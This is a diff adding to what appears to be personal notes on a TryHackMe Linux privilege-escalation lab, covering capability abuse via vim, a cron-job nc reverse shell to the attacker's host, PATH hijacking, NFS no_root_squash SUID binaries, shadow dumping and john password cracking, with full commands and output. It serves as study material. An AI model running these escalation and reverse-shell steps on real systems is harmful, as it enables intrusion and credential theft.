@@ -774,7 +774,7 @@ sudo setcap cap_setuid+ep vim
 
 now testing it to karen user
 ```
-/home/karen/vim ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+/home/karen/vim ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 # id
 uid=0(root) gid=1001(karen) groups=1001(karen)
 # bash
@@ -789,15 +789,483 @@ THM-9349843
 
 ```
 
+Another way to escalate is by using view
+```
+https://gtfobins.github.io/gtfobins/view/#capabilities 
+./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+# tested and worked 
+```
+
+**SUMMARY**  
+```
+# GET CAPABILITIES
+getcap -r / 2>/dev/null
+# check https://gtfobins.github.io/gtfobins
+# used vim 
+/home/karen/vim ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+# used view
+/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+# both got to root
+```
 
 
+### PRIVILEGE ESCALATION: Cronn Job
+
+me=10.10.39.133
+target=10.10.56.58
 
 
+```
+karen@ip-10-10-56-58:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+
+# now ill use the backup.sh
+
+chmod +x /home/karen/backup.sh
+karen@ip-10-10-56-58:~$ cat backup.sh
+#!/bin/bash
+
+mkfifo /tmp/f; nc 10.10.39.133 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+# NOTEI already setted up the Listener before hand made sure to have exec permission
+
+```
 
 
+My listener
+```
+┌──(root㉿kali)-[~/repo]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.39.133] from (UNKNOWN) [10.10.56.58] 33842
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /home/ubuntu/flag5.txt
+THM-383000283
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+karen:x:1001:1001::/home/karen:/bin/sh
+matt:x:1002:1002::/home/matt:/bin/sh
+
+cat /etc/shadow
+root:*:18561:0:99999:7:::
+daemon:*:18561:0:99999:7:::
+...
+karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upyMZZzqdZuzlJTuTHTlsKzQAbSZJr9iE21:18798:0:99999:7:::
+matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
+```
 
 
+Back to kali, create the unshadow file first then crack the passwords usiung john the ripper 
+```
+┌──(root㉿kali)-[~/repo]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadow.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456           (matt)
+Password1        (karen)
+```
 
+**SUMMARY**  
+```
+#Check cronn job
+cat /etc/crontab
+# edit backup script, create rev shell from nc 
+
+karen@ip-10-10-56-58:~$ cat backup.sh
+#!/bin/bash
+
+mkfifo /tmp/f; nc 10.10.39.133 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+# from the listener
+nc -lvnp 4444
+# once root pops
+cat /etc/passwd /etc/shadow
+
+unshadow passwd shadow > unshadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadow.txt
+```
+
+
+### LINUX PRIVILEGE ESCALATION: PATH 
+me=10.10.4.105
+target=10.10.146.169
+
+```
+karen@ip-10-10-146-169:/$ id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+karen@ip-10-10-146-169:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+karen@ip-10-10-146-169:/$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+dev/char
+run
+sys
+...
+home/murdoch
+tmp
+
+# /home/murdoch and tmp are our target locations for escalating 
+
+karen@ip-10-10-146-169:/$ cd /home/murdoch/
+karen@ip-10-10-146-169:/home/murdoch$ ls -l
+total 28
+-rwsr-xr-x 1 root  root  16712 Jun 20  2021 test
+-rw-rw-r-- 1 karen karen    10 Nov 30 08:59 thm
+-rw-rw-r-- 1 root  root     86 Jun 20  2021 thm.py
+
+# assume that thm.py is precompile of test bin which has root SUID
+#  -rwsr-xr-x 
+karen@ip-10-10-146-169:/home/murdoch$ cat thm.py
+/usr/bin/python3
+
+import os
+import sys
+
+try:
+        os.system("thm")
+        except:
+                sys.exit()
+
+# 
+karen@ip-10-10-146-169:/home/murdoch$ export PATH=/tmp:$PATH
+karen@ip-10-10-146-169:/home/murdoch$ echo "/bin/bash" > /tmp/thm
+karen@ip-10-10-146-169:/home/murdoch$ chmod +x /tmp/thm
+
+karen@ip-10-10-146-169:/home/murdoch$ id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+# Here we try to execute
+karen@ip-10-10-146-169:/home/murdoch$ ./test
+root@ip-10-10-146-169:/home/murdoch# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+root@ip-10-10-146-169:/home/murdoch# cat /home/murdoch/flag^C
+root@ip-10-10-146-169:/home/murdoch# find / -name flag6.txt 2>/dev/null
+/home/matt/flag6.txt
+# FLAG 
+root@ip-10-10-146-169:/home/murdoch# cat /home/matt/flag6.txt
+THM-736628929
+
+```
+
+
+### LINUX PRIVILEGE ESCALATION: NFS 
+me=10.10.4.105
+target=10.10.185.3
+target=10.10.2.24
+
+NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+
+The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+
+```
+karen@ip-10-10-185-3:/$ cat /etc/exports
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+karen@ip-10-10-185-3:/$ ls -la /home
+total 20
+drwxr-xr-x  5 root   root   4096 Jun 20  2021 .
+drwxr-xr-x 19 root   root   4096 Nov 30 09:45 ..
+drw-r--r--  2 root   root   4096 Jun 20  2021 backup
+drwxr-xr-x  2 root   root   4096 Jun 20  2021 matt
+drwxr-xr-x  5 ubuntu ubuntu 4096 Jun 20  2021 ubuntu
+
+```
+Now back on the kali machine, we're gonna mount the shared folder 
+
+```
+
+┌──(root㉿kali)-[/mnt]
+└─# mkdir exploit
+
+┌──(root㉿kali)-[/mnt]
+└─# mount -o rw 10.10.185.3:/home/ubuntu/sharedfolder /mnt/exploit
+
+# Creating exploit
+┌──(root㉿kali)-[/mnt/exploit]
+└─# cat escalate.c
+int main()
+{
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+
+┌──(root㉿kali)-[/mnt/exploit]
+└─# gcc escalate.c -o escalate -w
+
+
+┌──(root㉿kali)-[/mnt/exploit]
+└─# chmod +xs escalate
+
+┌──(root㉿kali)-[/mnt/exploit]
+└─# ls -l escalate
+-rwsr-sr-x 1 root root 16056 Nov 30 10:01 escalate
+
+# ANOTHER ATTEMPT 
+┌──(root㉿kali)-[/mnt/exploit]
+└─# cat exploit.c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+int main(void){
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+  return 0;
+}
+
+┌──(root㉿kali)-[/mnt/exploit]
+└─# gcc exploit.c -o exploit
+
+┌──(root㉿kali)-[/mnt/exploit]
+└─# chmod +s exploit
+
+┌──(root㉿kali)-[/mnt/exploit]
+└─# ls -l exploit
+-rwsr-sr-x 1 root root 16056 Nov 30 10:13 exploit
+
+```
+
+### Troubleshoot
+./code: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./code)
+> Kali Linux box was not working because the gcc compiler was too high, 
+> I used the attack box 
+
+
+karen@ip-10-10-2-24:/home/ubuntu/sharedfolder$ ./code
+./code: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./code)
+> Return to this task Privilege Escalation via NFS 
+
+** RETRY on ATTACKBOX**  
+me=10.10.79.12
+target=10.10.2.24
+
+
+c privilege escalate suid
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+int main(void){
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+  return 0;
+}
+
+```
+
+
+```
+karen@ip-10-10-69-219:/home/ubuntu/sharedfolder$ ls -l
+total 16
+-rwsr-sr-x 1 root root 8392 Nov 30 11:03 code
+-rw-r--r-- 1 root root  137 Nov 30 11:01 code.c
+karen@ip-10-10-69-219:/home/ubuntu/sharedfolder$ ./code
+root@ip-10-10-69-219:/home/ubuntu/sharedfolder# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+root@ip-10-10-69-219:/home/ubuntu/sharedfolder# find / -name flag7.txt 2> /dev/null
+/home/matt/flag7.txt
+root@ip-10-10-69-219:/home/ubuntu/sharedfolder# cat /home/matt/flag7.txt
+THM-89384012
+
+```
+
+
+### CAPSTONE
+
+me=10.10.165.119
+target=10.10.4.59
+
+leonard
+Penny123
+a
+
+```
+[leonard@ip-10-10-4-59 ~]$ ls -la /home
+total 4
+drwxr-xr-x.  5 root    root      50 Jun  7  2021 .
+dr-xr-xr-x. 18 root    root     235 Jun  7  2021 ..
+drwx------.  7 leonard leonard  197 Jun  7  2021 leonard
+drwx------. 16 missy   missy   4096 Jun  7  2021 missy
+drwx------.  2 root    root      23 Jun  7  2021 rootflag
+
+
+# tried crontab
+
+[leonard@ip-10-10-4-59 ~]$ wget 10.10.165.119:9999/les.sh
+--2022-11-30 15:05:29--  http://10.10.165.119:9999/les.sh
+Connecting to 10.10.165.119:9999... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 90917 (89K) [text/x-sh]
+Saving to: \u2018les.sh\u2019
+
+100%[==============================>] 90,917      --.-K/s   in 0s
+
+2022-11-30 15:05:29 (446 MB/s) - \u2018les.sh\u2019 saved [90917/90917]
+
+[leonard@ip-10-10-4-59 ~]$ bash les.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+
+// Compile with:
+//   gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+
+```
+
+dirty cow did not work, now trying the SUID approach
+```
+[leonard@ip-10-10-4-59 ~]$ find / -type -perm -04000 -ls 2>/dev/null
+[leonard@ip-10-10-4-59 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
+16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
+17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
+17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
+17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
+17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
+17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
+17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
+17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
+17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
+17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
+17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
+17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
+17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
+17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
+17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
+17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
+18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
+20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
+34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
+35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
+38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
+958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
+51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
+37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
+37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
+37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
+37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
+18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
+18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
+
+
+[leonard@ip-10-10-4-59 ~]$ LFILE=/etc/passwd
+[leonard@ip-10-10-4-59 ~]$ base64 "$LFILE" | base64 --decode
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+...
+leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+missy:x:1001:1001::/home/missy:/bin/bash
+
+[leonard@ip-10-10-4-59 ~]$ base64 "$LFILE" | base64 --decode
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+adm:*:18353:0:99999:7:::
+lp:*:18353:0:99999:7:::
+sync:*:18353:0:99999:7:::
+oprofile:!!:18785::::::
+tcpdump:!!:18785::::::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+mailnull:!!:18785::::::
+smmsp:!!:18785::::::
+nscd:!!:18785::::::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+
+
+# NOW LETS CRACK THE PASSWORD
+root@ip-10-10-165-119:~/repo# john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt crack.txt
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+  Cost 1 (iteration count) is 5000 for all loaded hashes
+  Will run 2 OpenMP threads
+  Press 'q' or Ctrl-C to abort, almost any other key for status
+  Password1        (missy)
+
+```
+
+
+Password Cracked now entering missy
+```
+[leonard@ip-10-10-4-59 ~]$ su missy
+Password:
+[missy@ip-10-10-4-59 leonard]$ sudo -l
+Matching Defaults entries for missy on ip-10-10-4-59:
+!visiblepw, always_set_home, match_group_by_gid,
+always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
+HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User missy may run the following commands on ip-10-10-4-59:
+(ALL) NOPASSWD: /usr/bin/find
+[missy@ip-10-10-4-59 leonard]$ find /home -name "flag*" 2>/dev/null
+/home/missy/Documents/flag1.txt
+
+```
+
+
+Find can be searched now
+```
+[leonard@ip-10-10-4-59 ~]$ LFILE=/home/missy/Documents/flag1.txt
+[leonard@ip-10-10-4-59 ~]$ base64 "$LFILE" | base64 --decode
+THM-42828719920544
+
+```
 
 
 
@@ -811,4 +1279,8 @@ Linux Privilege Escalation:
 > sudo -l, gtfobins.github.io
 - SUID 
 > 
+
+- CAPABILITIES 
+> getcap -r 2>/dev/null 
+ 
 
